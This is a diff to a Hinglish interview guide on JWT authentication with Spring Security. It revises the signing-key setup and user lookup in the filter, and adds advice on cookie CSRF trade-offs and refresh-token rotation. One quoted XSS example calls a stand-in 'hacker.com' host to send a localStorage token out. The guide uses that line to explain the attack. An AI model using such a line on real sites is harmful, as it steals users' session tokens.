@@ -1,6 +1,6 @@
 # JWT + Spring Security — Complete Interview Reference
 
-> **Most-asked authentication topic.** 80%+ Java backend interviews mein puchte. Theory deep + visualization-heavy.
+> **Backend interviews ka bahut poochha jaane wala auth topic.** Theory deep + visualization-heavy.
 
 ---
 
@@ -586,7 +586,7 @@ Hacker payload modify kare:
 │           Verify signature with SECRET                          │
 │           Check exp not expired                                 │
 │           Extract user info from payload                        │
-│           valid? → process; → 401                         │
+│           valid → process  ·  invalid → 401                     │
 │              ↓                                                  │
 │   Client ← user data                                            │
 │                                                                 │
@@ -816,36 +816,48 @@ public class JwtService {
     @Value("${jwt.expiration}")  // 15 min in milliseconds
     private long expiration;
 
-    // secret >= 32 chars (256-bit) — HS256 minimum. Build a SecretKey ONCE.
-    private final SecretKey key =
-        Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8));
+    // secret >= 32 chars (256-bit) — HS256 minimum.
+    // ★ TRAP: `private final SecretKey key = Keys.hmacShaKeyFor(secret.getBytes())` field pe likha to
+    //   NullPointerException — field initializer @Value inject hone se PEHLE chalta, tab secret = null.
+    //   Isliye helper method (tera usercrud yahi karta) ya @PostConstruct me key banao.
+    private SecretKey getSigningKey() {
+        return Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8));
+    }
 
     // ─── Generate token ─────────────────────────
     public String generateToken(User user) {
         return Jwts.builder()
             .subject(user.getId().toString())          // 0.12.x: setSubject -> subject
             .claim("name", user.getName())
+            .claim("email", user.getEmail())
             .claim("role", user.getRole())
             .issuedAt(new Date())                      // setIssuedAt -> issuedAt
             .expiration(new Date(System.currentTimeMillis() + expiration))
-            .signWith(key)                             // algo INFERRED from key (no SignatureAlgorithm.HS256)
+            .signWith(getSigningKey())                 // algo INFERRED from key (no SignatureAlgorithm.HS256)
             .compact();
     }
 
     // ─── Extract userId from token ──────────────
     public String extractUserId(String token) {
         return Jwts.parser()
-            .verifyWith(key)                           // 0.12.x: setSigningKey -> verifyWith
+            .verifyWith(getSigningKey())               // 0.12.x: setSigningKey -> verifyWith
             .build()                                   // parser ab BUILD hota (builder pattern)
             .parseSignedClaims(token)                  // parseClaimsJws -> parseSignedClaims
             .getPayload()                              // getBody -> getPayload
             .getSubject();
     }
 
+    // ─── Extract email (filter isse user load karta) ──
+    public String extractEmail(String token) {
+        return Jwts.parser().verifyWith(getSigningKey()).build()
+            .parseSignedClaims(token).getPayload()
+            .get("email", String.class);
+    }
+
     // ─── Validate token ─────────────────────────
     public boolean isValid(String token) {
         try {
-            Jwts.parser().verifyWith(key).build().parseSignedClaims(token);
+            Jwts.parser().verifyWith(getSigningKey()).build().parseSignedClaims(token);
             return true;   // signature + exp valid
         } catch (JwtException e) {
             return false;  // invalid/expired
@@ -900,8 +912,10 @@ public class JwtFilter extends OncePerRequestFilter {
         }
 
         // 3. Extract user + load details
-        String userId = jwtService.extractUserId(token);
-        UserDetails userDetails = userDetailsService.loadUserByUsername(userId);
+        //    loadUserByUsername ko wahi do jisse user DB me dhoondha jaata hai.
+        //    usercrud me wo EMAIL hai (claim "email"), sub (userId) nahi.
+        String email = jwtService.extractEmail(token);
+        UserDetails userDetails = userDetailsService.loadUserByUsername(email);
 
         // 4. Set SecurityContext (so downstream code knows who's logged in)
         UsernamePasswordAuthenticationToken auth =
@@ -1050,6 +1064,9 @@ JS attack:
    fetch('hacker.com/steal?token=' + localStorage.getItem('token'));
 ```
 **Fix:** **httpOnly cookies** (JS can't read).
+★ Par token cookie me gaya to browser use APNE-AAP bhejega -> CSRF wapas aa jaata (upar CSRF section).
+  To cookie ke saath `SameSite=Strict/Lax` + CSRF protection chalu rakho. Header-JWT = CSRF nahi, par XSS dhyan;
+  cookie-JWT = XSS se bacha, par CSRF dhyan. Dono ka trade-off hai.
 
 ### 2. **No `exp` claim** = token valid forever
 **Fix:** Always set 15 min - 1 hour expiration.
@@ -1064,7 +1081,7 @@ JS attack:
 **Fix:** User ID + role only. Never password/SSN/credit card.
 
 ### 6. **No token rotation on refresh**
-**Fix:** Issue NEW refresh token on each refresh (sliding expiration).
+**Fix:** Har refresh pe NAYA refresh token do aur purana DB se hatao (rotation). Purana dobara aaye = chori ka shaq -> us user ke saare refresh token band.
 
 ### 7. **Algorithm confusion attack**
 ```
